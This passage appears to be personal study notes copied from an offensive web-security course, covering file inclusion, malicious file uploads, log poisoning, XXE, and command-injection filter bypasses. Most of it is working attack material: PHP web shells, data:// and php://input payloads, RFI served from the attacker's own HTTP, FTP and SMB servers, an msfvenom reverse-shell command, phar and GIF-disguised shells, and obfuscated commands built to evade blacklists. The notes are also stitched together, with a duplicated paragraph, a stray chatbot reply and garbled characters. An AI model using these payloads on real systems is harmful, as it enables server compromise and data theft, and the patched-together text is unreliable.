can be used to include external data, including PHP code. We can also pass it base64 encoded strings with text/plain;base64, and it has the ability to decode them and execute the PHP code.\nSo, our first step would be to base64 encode a basic PHP web shell, as follows:\nPHP Wrappers\ncube111@local[/local]$ echo '\u003c?php system($_GET[\"cmd\"]); ?\u003e' | base64 PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg== Now, we can URL encode the base64 string, and then pass it to the data wrapper with data://text/plain;base64,. Finally, we can use pass comm\ncube111@local[/local]$ curl -s 'http://\u003cSERVER_IP\u003e:\u003cPORT\u003e/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D\u0026cmd=id' | grep uid ands to the web shell with \u0026cmd=\u003cCOMMAND\u003e:\nInput ube111@local[/local]$ curl -s -X POST --data '\u003c?php system($_GET[\"cmd\"]); ?\u003e' \"http://\u003cSERVER_IP\u003e:\u003cPORT\u003e/index.php?language=php://input\u0026cmd=id\" | grep uid uid=33(www-data) gid=33(www-data) groups=33(www-data) Expect cube111@local[/local]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect extension=expect cube111@local[/local]$ curl -s \"http://\u003cSERVER_IP\u003e:\u003cPORT\u003e/index.php?language=expect://id\" uid=33(www-data) gid=33(www-data) groups=33(www-data) Remote File Inclusion (RFI) Verify RFI In most languages, including remote URLs is considered as a dangerous practice as it may allow for such vulnerabilities. This is why remote URL inclusion is usually disabled by default. For example, any remote URL inclusion in PHP would require the allow_url_include setting to be enabled. We can check whether this setting is enabled through LFI, as we did in the previous section:\nRemote File Inclusion (RFI)\ncube111@local[/local]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include allow_url_include = On cube111@local[/local]$ echo '\u003c?php system($_GET[\"cmd\"]); ?\u003e' \u003e shell.php cube111@local[/local]$ sudo python3 -m http.server \u003cLISTENING_PORT\u003e Serving HTTP on 0.0.0.0 port \u003cLISTENING_PORT\u003e (http://0.0.0.0:\u003cLISTENING_PORT\u003e/) ... FTP As mentioned earlier, we may also host our script through the FTP protocol. We can start a basic FTP server with Python‚Äôs pyftpdlib, as follows:\nRemote File Inclusion (RFI)\ncube111@local[/local]$ sudo python -m pyftpdlib -p 21 [SNIP] \u003e\u003e\u003e starting FTP server on 0.0.0.0:21, pid=23686 \u003c\u003c\u003c [SNIP] concurrency model: async [SNIP] masquerade (NAT) address: None [SNIP] passive ports: None cube111@local[/local]$ curl 'http://\u003cSERVER_IP\u003e:\u003cPORT\u003e/index.php?language=ftp://user:pass@localhost/shell.php\u0026cmd=id' ...SNIP... uid=33(www-data) gid=33(www-data) groups=33(www-data) SMB cube111@local[/local]$ impacket-smbserver -smb2support share $(pwd) Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation [*] Config file parsed [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 [*] Config file parsed [*] Config file parsed [*] Config file parsed Now, we can include our script by using a UNC path (e.g. \\\\\u003cOUR_IP\u003e\\share\\shell.php), and specify the command with (\u0026cmd=whoami) as we did earlier:\nAs we can see, this attack works in including our remote script, and we do not need any non-default settings to be enabled. However, we must note that this technique is more likely to work if we were on the same network, as accessing remote SMB servers over the internet may be disabled by default, depending on the Windows server configurations.\ncube111@local[/local]$ impacket-smbserver -smb2support share $(pwd) Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation [*] Config file parsed [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 [*] Config file parsed [*] Config file parsed [*] Config file parsed Now, we can include our script by using a UNC path (e.g. \\\\\u003cOUR_IP\u003e\\share\\shell.php), and specify the command with (\u0026cmd=whoami) as we did earlier:\nAs we can see, this attack works in including our remote script, and we do not need any non-default settings to be enabled. However, we must note that this technique is more likely to work if we were on the same network, as accessing remote SMB servers over the internet may be disabled by default, depending on the Windows server configurations.\nLFI and File Uploads Crafting Malicious Image Our first step is to create a malicious image containing a PHP web shell code that still looks and works as an image. So, we will use an allowed image extension in our file name (e.g. shell.gif), and should also include the image magic bytes at the beginning of the file content (e.g. GIF8), just in case the upload form checks for both the extension and content type as well. We can do so as follows:\nLFI and File Uploads\ncube111@local[/local]$ echo 'GIF8\u003c?php system($_GET[\"cmd\"]); ?\u003e' \u003e shell.gif Uploaded File Path Once we‚Äôve uploaded our file, all we need to do is include it through the LFI vulnerability. To include the uploaded file, we need to know the path to our uploaded file. In most cases, especially with images, we would get access to our uploaded file and can get its path from its URL. In our case, if we inspect the source code after uploading the image, we can get its URL:\nCode: html\n\u003cimg src=\"/profile_images/shell.gif\" class=\"profile-image\" id=\"profile-image\"\u003e Zip Upload cube111@local[/local]$ echo '\u003c?php system($_GET[\"cmd\"]); ?\u003e' \u003e shell.php \u0026\u0026 zip shell.jpg shell.php cube111@local[/local]$ echo '\u003c?php system($_GET[\"cmd\"]); ?\u003e' \u003e shell.php \u0026\u0026 zip shell.jpg shell.php Phar Upload Finally, we can use the phar:// wrapper to achieve a similar result. To do so, we will first write the following PHP script into a shell.php file:\nCode: php\n\u003c?php $phar = new Phar('shell.phar'); $phar-\u003estartBuffering(); $phar-\u003eaddFromString('shell.txt', '\u003c?php system($_GET[\"cmd\"]); ?\u003e'); $phar-\u003esetStub('\u003c?php __HALT_COMPILER(); ?\u003e'); $phar-\u003estopBuffering(); This script can be compiled into a phar file that when called would write a web shell to a shell.txt sub-file, which we can interact with. We can compile it into a phar file and rename it to shell.jpg as follows:\nLFI and File Uploads\ncube111@local[/local]$ php --define phar.readonly=0 shell.php \u0026\u0026 mv shell.phar shell.jpg Now, we should have a phar file called shell.jpg. Once we upload it to the web application, we can simply call it with phar:// and provide its URL path, and then specify the phar sub-file with /shell.txt (URL encoded) to get the output of the command we specify with (\u0026cmd=id), as follows:\nAs we can see, the id command was successfully executed. Both the zip and phar wrapper methods should be considered as alternative methods in case the first method did not work, as the first method we discussed is the most reliable among the three.\nNote: There is another (obsolete) LFI/uploads attack worth noting, which occurs if file uploads is enabled in the PHP configurations and the phpinfo() page is somehow exposed to us. However, this attack is not very common, as it has very specific requirements for it to work (LFI + uploads enabled + old PHP + exposed phpinfo()). If you are interested in knowing more about it, you can refer to This Link.\nLog Poisoning PHP Session Poisoning Most PHP web applications utilize PHPSESSID cookies, which can hold specific user-related data on the back-end, so the web application can keep track of user details through their cookies. These details are stored in session files on the back-end, and saved in /var/lib/php/sessions/ on Linux and in C:\\Windows\\Temp\\ on Windows. The name of the file that contains our user‚Äôs data matches the name of our PHPSESSID cookie with the sess_ prefix. For example, if the PHPSESSID cookie is set to el4ukv0kqbvoirg7nkp4dncpk3, then its location on disk would be /var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3.\nhttp://\u003cSERVER_IP\u003e:\u003cPORT\u003e/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd http://\u003cSERVER_IP\u003e:\u003cPORT\u003e/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E Finally, we can include the session file and use the \u0026cmd=id to execute a commands:\nServer Log Poisoning Once poisoned, we need to include the logs through the LFI vulnerability, and for that we need to have read-access over the logs. Nginx logs are readable by low privileged users by default (e.g. www-data), while the Apache logs are only readable by users with high privileges (e.g. root/adm groups). However, in older or misconfigured Apache servers, these logs may be readable by low-privileged users.\nBy default, Apache logs are located in /var/log/apache2/ on Linux and in C:\\xampp\\apache\\logs\\ on Windows, while Nginx logs are located in /var/log/nginx/ on Linux and in C:\\nginx\\log\\ on Windows. However, the logs may be in a different location in some cases, so we may use an LFI Wordlist to fuzz for their locations, as will be discussed in the next section.\nSo, let‚Äôs try including the Apache access log from /var/log/apache2/access.log, and see what we get:\nTo do so, we will use Burp Suite to intercept our earlier LFI request and modify the User-Agent header to Apache Log Poisoning:\nWe may also poison the log by sending a request through cURL, as follows:\nLog Poisoning\ncube111@local[/local]$ echo -n \"User-Agent: \u003c?php system(\\$_GET['cmd']); ?\u003e\" \u003e Poison cube111@local[/local]$ curl -s \"http://\u003cSERVER_IP\u003e:\u003cPORT\u003e/index.php\" -H @Poison Tip: The User-Agent header is also shown on process files under the Linux /proc/ directory. So, we can try including the /proc/self/environ or /proc/self/fd/N files (where N is a PID usually between 0-50), and we may be able to perform the same attack on these files. This may become handy in case we did not have read access over the server logs, however, these files may only be readable by privileged users as well.\n/var/log/sshd.log /var/log/mail /var/log/vsftpd.log Automated Scanning Fuzzing Parameters https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html#top-25-parameters\ncube111@local[/local]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://\u003cSERVER_IP\u003e:\u003cPORT\u003e/index.php?FUZZ=value' -fs 2287 ...SNIP... :: Method : GET :: URL : http://\u003cSERVER_IP\u003e:\u003cPORT\u003e/index.php?FUZZ=value :: Wordlist : FUZZ: /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403 :: Filter : Response size: xxx ________________________________________________ language [Status: xxx, Size: xxx, Words: xxx, Lines: xxx] There are a number of LFI Wordlists we can use for this scan. A good wordlist is LFI-Jhaddix.txt, as it contains various bypasses and common files, so it makes it easy to run several tests at once. We can use this wordlist to fuzz the ?language= parameter we have been testing throughout the module, as follows:\ncube111@local[/local]$ ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://\u003cSERVER_IP\u003e:\u003cPORT\u003e/index.php?language=FUZZ' -fs 2287 ...SNIP... :: Method : GET :: URL : http://\u003cSERVER_IP\u003e:\u003cPORT\u003e/index.php?FUZZ=key :: Wordlist : FUZZ: /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403 :: Filter : Response size: xxx ________________________________________________ ..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91] ../../../../../../../../../../../../etc/hosts [Status: 200, Size: 2461, Words: 636, Lines: 72] ...SNIP... ../../../../etc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91] ../../../../../etc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91] ../../../../../../etc/passwd\u0026=%3C%3C%3C%3C [Status: 200, Size: 3661, Words: 645, Lines: 91] ..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd [Status: 200, Size: 3661, Words: 645, Lines: 91] /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd [Status: 200, Size: 3661 Server Webroot cube111@local[/local]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://\u003cSERVER_IP\u003e:\u003cPORT\u003e/index.php?language=../../../../FUZZ/index.php' -fs 2287 ...SNIP... : Method : GET :: URL : http://\u003cSERVER_IP\u003e:\u003cPORT\u003e/index.php?language=../../../../FUZZ/index.php :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response size: 2287 ________________________________________________ /var/www/html/ [Status: 200, Size: 0, Words: 1, Lines: 1] cube111@local[/local]$ ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://\u003cSERVER_IP\u003e:\u003cPORT\u003e/index.php?language=../../../../FUZZ' -fs 2287 ...SNIP... :: Method : GET :: URL : http://\u003cSERVER_IP\u003e:\u003cPORT\u003e/index.php?language=../../../../FUZZ :: Wordlist : FUZZ: ./LFI-WordList-Linux :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response size: 2287 ________________________________________________ /etc/hosts [Status: 200, Size: 2461, Words: 636, Lines: 72] /etc/hostname [Status: 200, Size: 2300, Words: 634, Lines: 66] /etc/login.defs [Status: 200, Size: 12837, Words: 2271, Lines: 406] /etc/fstab [Status: 200, Size: 2324, Words: 639, Lines: 66] /etc/apache2/apache2.conf [Status: 200, Size: 9511, Words: 1575, Lines: 292] /etc/issue.net [Status: 200, Size: 2306, Words: 636, Lines: 66] ...SNIP... /etc/apache2/mods-enabled/status.conf [Status: 200, Size: 3036, Words: 715, Lines: 94] /etc/apache2/mods-enabled/alias.conf [Status: 200, Size: 3130, Words: 748, Lines: 89] /etc/apache2/envvars [Status: 200, Size: 4069, Words: 823, Lines: 112] /etc/adduser.conf [Status: 200, Size: 5315, Words: 1035, Lines: 153] File Upload Attacks Absent Validation We can download any of these web shells for the language of our web application (PHP in our case), then upload it through the vulnerable upload feature, and visit the uploaded file to interact with the web shell. For example, let‚Äôs try to upload phpbash.php from phpbash to our web application, and then navigate to its link by clicking on the Download button:\nWeb Shells \u003c?php system($_REQUEST['cmd']); ?\u003e cube111@local[/local]$ msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw \u003e reverse.php ...SNIP... Payload size: 3033 bytes Client-Side Validation bypass Disabling Front-end Validation Blacklist Filters $fileName = basename($_FILES[\"uploadFile\"][\"name\"]); $extension = pathinfo($fileName, PATHINFO_EXTENSION); $blacklist = array('php', 'php7', 'phps'); if (in_array($extension, $blacklist)) { echo \"File type not allowed\"; die(); } Tip: The comparison above is also case-sensitive, and is only considering lowercase extensions. In Windows Servers, file names are case insensitive, so we may try uploading a php with a mixed-case (e.g. pHp), which may bypass the blacklist as well, and should still execute as a PHP script.\nThere are many lists of extensions we can utilize in our fuzzing scan. PayloadsAllTheThings provides lists of extensions for PHP and .NET web applications. We may also use SecLists list of common Web Extensions.\nWhitelist Filters Double Extensions The code only tests whether the file name contains an image extension; a straightforward method of passing the regex test is through Double Extensions. For example, if the .jpg extension was allowed, we can add it in our uploaded file name and still end our filename with .php (e.g. shell.jpg.php), in which case we should be able to pass the whitelist test, while still uploading a PHP script that can execute PHP code.\nReverse Double Extension \u003cFilesMatch \".+\\.ph(ar|p|tml)\"\u003e SetHandler application/x-httpd-php \u003c/FilesMatch\u003e The above configuration is how the web server determines which files to allow PHP code execution. It specifies a whitelist with a regex pattern that matches .phar, .php, and .phtml. However, this regex pattern can have the same mistake we saw earlier if we forget to end it with ($). In such cases, any file that contains the above extensions will be allowed PHP code execution, even if it does not end with the PHP extension. For example, the file name (shell.php.jpg) should pass the earlier whitelist test as it ends with (.jpg), and it would be able to execute PHP code due to the above misconfiguration, as it contains (.php) in its name.\nCharacter Injection Finally, let‚Äôs discuss another method of bypassing a whitelist validation test through Character Injection. We can inject several characters before or after the final extension to cause the web application to misinterpret the filename and execute the uploaded file as a PHP script.\nThe following are some of the characters we may try injecting:\n%20 %0a %00 %0d0a / .\\ . ‚Ä¶ : Each character has a specific use case that may trick the web application to misinterpret the file extension. For example, (shell.php%00.jpg) works with PHP servers with version 5.X or earlier, as it causes the PHP web server to end the file name after the (%00), and store it as (shell.php), while still passing the whitelist. The same may be used with web applications hosted on a Windows server by injecting a colon (:) before the allowed file extension (e.g. shell.aspx:.jpg), which should also write the file as (shell.aspx). Similarly, each of the other characters has a use case that may allow us to upload a PHP script while bypassing the type validation test.\nWe can write a small bash script that generates all permutations of the file name, where the above characters would be injected before and after both the PHP and JPG extensions, as follows:\nCode: bash\nfor char in '%20' '%0a' '%00' '%0d0a' '/' '.\\\\' '.' '‚Ä¶' ':'; do for ext in '.php' '.phps'; do echo \"shell$char$ext.jpg\" \u003e\u003e wordlist.txt echo \"shell$ext$char.jpg\" \u003e\u003e wordlist.txt echo \"shell.jpg$char$ext\" \u003e\u003e wordlist.txt echo \"shell.jpg$ext$char\" \u003e\u003e wordlist.txt done done Type Filters $type = $_FILES['uploadFile']['type']; if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) { echo \"Only images are allowed\"; die(); } MIME-Type We may start by fuzzing the Content-Type header with SecLists‚Äô Content-Type Wordlist through Burp Intruder, to see which types are allowed. However, the message tells us that only images are allowed, so we can limit our scan to image types, which reduces the wordlist to 45 types only (compared to around 700 originally). We can do so as follows:\nType Filters\ncube111@local[/local]$ echo \"this is a text file\" \u003e text.jpg cube111@local[/local]$ file text.jpg text.jpg: ASCII text As we see, the file‚Äôs MIME type is ASCII text, even though its extension is .jpg. However, if we write GIF8 to the beginning of the file, it will be considered as a GIF image instead, even though its extension is still .jpg:\nType Filters\ncube111@local[/local]$ echo \"GIF8\" \u003e text.jpg cube111@local[/local]$file text.jpg text.jpg: GIF image data Web servers can also utilize this standard to determine file types, which is usually more accurate than testing the file extension. The following example shows how a PHP web application can test the MIME type of an uploaded file:\nCode: php\n$type = mime_content_type($_FILES['uploadFile']['tmp_name']); if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) { echo \"Only images are allowed\"; die(); } curl -X POST -F ‚Äúfile=@/home/sinner/Documents/oscp/test.txt‚Äù -F filename=\"/tmp/test.txt\" http://192.168.185.249:33414/file-upload\nLimited File Uploads XSS We can see that the Comment parameter was updated to our XSS payload. When the image‚Äôs metadata is displayed, the XSS payload should be triggered, and the JavaScript code will be executed to carry the XSS attack. Furthermore, if we change the image‚Äôs MIME-Type to text/html, some web applications may show it as an HTML document instead of an image, in which case the XSS payload would be triggered even if the metadata wasn‚Äôt directly displayed.\nFinally, XSS attacks can also be carried with SVG images, along with several other attacks. Scalable Vector Graphics (SVG) images are XML-based, and they describe 2D vector graphics, which the browser renders into an image. For this reason, we can modify their XML data to include an XSS payload. For example, we can write the following to local.svg:\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003c!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\"\u003e \u003csvg xmlns=\"http://www.w3.org/2000/svg\" version=\"1.1\" width=\"1\" height=\"1\"\u003e \u003crect x=\"1\" y=\"1\" width=\"1\" height=\"1\" fill=\"green\" stroke=\"black\" /\u003e \u003cscript type=\"text/javascript\"\u003ealert(window.origin);\u003c/script\u003e \u003c/svg\u003e cube111@local[/local]$ exiftool -Comment=' \"\u003e\u003cimg src=1 onerror=alert(window.origin)\u003e' local.jpg cube111@local[/local]$ exiftool local.jpg ...SNIP... Comment : \"\u003e\u003cimg src=1 onerror=alert(window.origin)\u003e XXE \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003c!DOCTYPE svg [ \u003c!ENTITY xxe SYSTEM \"file:///etc/passwd\"\u003e ]\u003e \u003csvg\u003e\u0026xxe;\u003c/svg\u003e source code disclosure Code: xml \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003c!DOCTYPE svg [ \u003c!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\"\u003e ]\u003e \u003csvg\u003e\u0026xxe;\u003c/svg\u003e Using XML data is not unique to SVG images, as it is also utilized by many types of documents, like PDF, Word Documents, PowerPoint Documents, among many others. All of these documents include XML data within them to specify their format and structure. Suppose a web application used a document viewer that is vulnerable to XXE and allowed uploading any of these documents. In that case, we may also modify their XML data to include the malicious XXE elements, and we would be able to carry a blind XXE attack on the back-end web server.\nAnother similar attack that is also achievable through these file types is an SSRF attack. We may utilize the XXE vulnerability to enumerate the internally available services or even call private APIs to perform private actions. For more about SSRF, you may refer to the Server-side Attacks module.\nOther File Upload Attacks üß™ Injections in File Name Command Injection via file name:\nbash\nCopyEdit\nfile$(whoami).jpgfile`whoami`.jpgfile.jpg||whoami\nIf used in OS commands (e.g., mv), it may execute arbitrary code.\nXSS Injection:\nhtml\nCopyEdit\n\u003cscript\u003ealert(window.origin);\u003c/script\u003e\nIf file name is reflected in the UI.\nSQL Injection:\nsql\nCopyEdit\nfile';select+sleep(5);--.jpg\nDangerous if used directly in SQL queries.\nüìÅ Upload Directory Disclosure No direct link to uploaded file? Try:\nFuzzing to find directories\nLFI/XXE to read source code\nIDOR techniques to locate stored files\nTriggering Errors:\nUpload file with duplicate name\nSend two identical requests simultaneously\nUpload a file with an extremely long name (e.g., 5000 chars)\nErrors might disclose upload paths\nü™ü Windows-Specific Attacks Reserved Characters:\nbash\nCopyEdit\n*, ?, \u003c, \u003e, |\nMight cause errors or disclosure if unsanitized.\nReserved File Names:\nbash\nCopyEdit\nCON, COM1, LPT1, NUL\nNot allowed as filenames‚Äîcan be used to cause errors.\n8.3 Filename Convention:\nUsed to refer to files using tilde (~):\nbash\nCopyEdit\nHAC~1.TXT for hackthebox.txtWEB~.CONF to potentially overwrite web.conf\nCan lead to:\nInformation disclosure\nDenial of Service\nUnauthorized file access\nüß¨ Advanced File Upload Attacks Exploitable cases where automatic processing occurs:\nVideo encoding\nFile compression\nFile renaming\nVulnerable Libraries:\nExample: AVI upload ‚Üí XXE via ffmpeg Custom code might hide unique vulnerabilities‚Äîrequires in-depth analysis.\nüìö Bug bounty reports are a great source to study advanced file upload techniques.\nLet me know if you want this turned into a visual mindmap or want to dive deeper into any technique.\nCommand Injection Methods To inject an additional command to the intended one, we may use any of the following operators:\nInjection Operator Injection Character URL-Encoded Character Executed Command Semicolon ; %3b Both New Line \\n %0a Both Background \u0026 %26 Both (second output generally shown first) Pipe | %7c Both (only second output is shown) AND \u0026\u0026 %26%26 Both (only if first succeeds) OR | %7c%7c Second (only if first fails) Sub-Shell `` %60%60 Both (Linux-only) Sub-Shell $() %24%28%29 Both (Linux-only) AND Operator We can start with the AND (\u0026\u0026) operator, such that our final payload would be (127.0.0.1 \u0026\u0026 whoami), and the final executed command would be the following:\nCode: bash\nping -c 1 127.0.0.1 \u0026\u0026 whoami OR Operator Finally, let us try the OR (||) injection operator. The OR operator only executes the second command if the first command fails to execute. This may be useful for us in cases where our injection would break the original command without having a solid way of having both commands work. So, using the OR operator would make our new command execute if the first one fails.\nIf we try to use our usual payload with the || operator (127.0.0.1 || whoami), we will see that only the first command would execute:\nOther Injection Operators\n21y4d@local[/local]$ ping -c 1 127.0.0.1 || whoami\rPING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\r64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.635 ms\r--- 127.0.0.1 ping statistics ---\r1 packets transmitted, 1 received, 0% packet loss, time 0ms\rrtt min/avg/max/mdev = 0.635/0.635/0.635/0.000 ms Filter/WAF Detection Blacklisted Characters A web application may have a list of blacklisted characters, and if the command contains them, it would deny the request. The PHP code may look something like the following:\nCode: php\n$blacklist = ['\u0026', '|', ';', ...SNIP...];\rforeach ($blacklist as $character) {\rif (strpos($_POST['ip'], $character) !== false) {\recho \"Invalid input\";\r}\r} Injection Operator Injection Character URL-Encoded Character Executed Command Semicolon ; %3b Both New Line \\n %0a Both Background \u0026 %26 Both (second output generally shown first) Pipe | %7c Both (only second output is shown) AND \u0026\u0026 %26%26 Both (only if first succeeds) OR | %7c%7c Second (only if first fails) Sub-Shell `` %60%60 Both (Linux-only) Sub-Shell $() %24%28%29 Both (Linux-only) Bypassing Space Filters Bypass Blacklisted Operators Bypass Blacklisted Spaces Now that we have a working injection operator, let us modify our original payload and send it again as (127.0.0.1%0a whoami): As we can see, we still get an invalid input error message, meaning that we still have other filters to bypass. So, as we did before, let us only add the next character (which is a space) and see if it caused the denied request: As we can see, the space character is indeed blacklisted as well. A space is a commonly blacklisted character, especially if the input should not contain any spaces, like an IP, for example. Still, there are many ways to add a space character without actually using the space character!\nUsing Tabs Using tabs (%09) instead of spaces is a technique that may work, as both Linux and Windows accept commands with tabs between arguments, and they are executed the same. So, let us try to use a tab instead of the space character (127.0.0.1%0a%09) and see if our request is accepted: As we can see, we successfully bypassed the space character filter by using a tab instead. Let us see another method of replacing space characters.\nUsing $IFS Using the ($IFS) Linux Environment Variable may also work since its default value is a space and a tab, which would work between command arguments. So, if we use ${IFS}\\ where the spaces should be, the variable should be automatically replaced with a space, and our command should work.\nLet us use ${IFS} and see if it works (127.0.0.1%0a${IFS}): Using Brace Expansion There are many other methods we can utilize to bypass space filters. For example, we can use the Bash Brace Expansion feature, which automatically adds spaces between arguments wrapped between braces, as follows:\nBypassing Space Filters\ncube111@local[/local]$ {ls,-la} total 0 drwxr-xr-x 1 21y4d 21y4d 0 Jul 13 07:37 . drwxr-xr-x 1 21y4d 21y4d 0 Jul 13 13:01 .. As we can see, the command was successfully executed without having spaces in it. We can utilize the same method in command injection filter bypasses, by using brace expansion on our command arguments, like (127.0.0.1%0a{ls,-la}). To discover more space filter bypasses, check out the PayloadsAllTheThings page on writing commands without spaces.\nBypassing Other Blacklisted Characters Besides injection operators and space characters, a very commonly blacklisted character is the slash (/) or backslash (\\) character, as it is necessary to specify directories in Linux or Windows. We can utilize several techniques to produce any character we want while avoiding the use of blacklisted characters.\ncube111@local[/local]$ echo ${PATH} /usr/local/bin:/usr/bin:/bin:/usr/games So, if we start at the 0 character, and only take a string of length 1, we will end up with only the / character, which we can use in our payload:\nBypassing Other Blacklisted Characters\ncube111@local[/local]$ echo ${PATH:0:1} / We can do the same with the $HOME or $PWD environment variables as well. We can also use the same concept to get a semi-colon character, to be used as an injection operator. For example, the following command gives us a semi-colon:\nBypassing Other Blacklisted Characters\ncube111@local[/local]$ echo ${LS_COLORS:10:1} ; Windows The same concept works on Windows as well. For example, to produce a slash in Windows Command Line (CMD), we can echo a Windows variable (%HOMEPATH% -\u003e \\Users\\local-student), and then specify a starting position (~6 -\u003e \\local-student), and finally specifying a negative end position, which in this case is the length of the username local-student (-11 -\u003e \\) :\nBypassing Other Blacklisted Characters\nC:\\local\u003e echo %HOMEPATH:~6,-11%\r\\ We can achieve the same thing using the same variables in Windows PowerShell. With PowerShell, a word is considered an array, so we have to specify the index of the character we need. As we only need one character, we don‚Äôt have to specify the start and end positions:\nBypassing Other Blacklisted Characters\nPS C:\\local\u003e $env:HOMEPATH[0]\r\\\rPS C:\\local\u003e $env:PROGRAMFILES[10]\rPS C:\\local\u003e We can also use the Get-ChildItem Env: PowerShell command to print all environment variables and then pick one of them to produce a character we need. Try to be creative and find different commands to produce similar characters.\nCharacter Shifting There are other techniques to produce the required characters without using them, like shifting characters. For example, the following Linux command shifts the character we pass by 1. So, all we have to do is find the character in the ASCII table that is just before our needed character (we can get it with man ascii), then add it instead of [ in the below example. This way, the last printed character would be the one we need:\nBypassing Other Blacklisted Characters\ncube111@local[/local]$ man ascii # \\ is on 92, before it is [ on 91 cube111@local[/local]$ echo $(tr '!-}' '\"-~'\u003c\u003c\u003c[) \\ Bypassing Blacklisted Commands Linux \u0026 Windows One very common and easy obfuscation technique is inserting certain characters within our command that are usually ignored by command shells like Bash or PowerShell and will execute the same command as if they were not there. Some of these characters are a single-quote ' and a double-quote \", in addition to a few others.\nThe easiest to use are quotes, and they work on both Linux and Windows servers. For example, if we want to obfuscate the whoami command, we can insert single quotes between its characters, as follows:\nBypassing Blacklisted Commands\n21y4d@local[/local]$ w'h'o'am'i 21y4d The same works with double-quotes as well:\nBypassing Blacklisted Commands\n21y4d@local[/local]$ w\"h\"o\"am\"i 21y4d The important things to remember are that we cannot mix types of quotes and the number of quotes must be even. We can try one of the above in our payload (127.0.0.1%0aw'h'o'am'i) and see if it works:\nBurp POST Request Linux Only We can insert a few other Linux-only characters in the middle of commands, and the bash shell would ignore them and execute the command. These characters include the backslash \\ and the positional parameter character $@. This works exactly as it did with the quotes, but in this case, the number of characters do not have to be even, and we can insert just one of them if we want to:\nCode: bash\nwho$@ami w\\ho\\am\\i Exercise: Try the above two examples in your payload, and see if they work in bypassing the command filter. If they do not, this may indicate that you may have used a filtered character. Would you be able to bypass that as well, using the techniques we learned in the previous section?\nWindows Only There are also some Windows-only characters we can insert in the middle of commands that do not affect the outcome, like a caret (^) character, as we can see in the following example:\nBypassing Blacklisted Commands\nC:\\local\u003e who^ami\r21y4d 21y4d@local[/local]$ $(tr \"[A-Z]\" \"[a-z]\"\u003c\u003c\u003c\"WhOaMi\") 21y4d Reversed Commands Another command obfuscation technique we will discuss is reversing commands and having a command template that switches them back and executes them in real-time. In this case, we will be writing imaohw instead of whoami to avoid triggering the blacklisted command.\nWe can get creative with such techniques and create our own Linux/Windows commands that eventually execute the command without ever containing the actual command words. First, we‚Äôd have to get the reversed string of our command in our terminal, as follows:\nAdvanced Command Obfuscation\ncube111@local[/local]$ echo 'whoami' | rev imaohw Then, we can execute the original command by reversing it back in a sub-shell ($()), as follows:\nAdvanced Command Obfuscation\n21y4d@local[/local]$ $(rev\u003c\u003c\u003c'imaohw') 21y4d We see that even though the command does not contain the actual whoami word, it does work the same and provides the expected output. We can also test this command with our exercise, and it indeed works:\nBurp POST Request Tip: If you wanted to bypass a character filter with the above method, you‚Äôd have to reverse them as well, or include them when reversing the original command.\nThe same can be applied in Windows. We can first reverse a string, as follows:\nAdvanced Command Obfuscation\nPS C:\\local\u003e \"whoami\"[-1..-20] -join ''\rimaohw We can now use the below command to execute a reversed string with a PowerShell sub-shell (iex \"$()\"), as follows:\nAdvanced Command Obfuscation\nPS C:\\local\u003e iex \"$('imaohw'[-1..-20] -join '')\"\r21y4d Encoded Commands The final technique we will 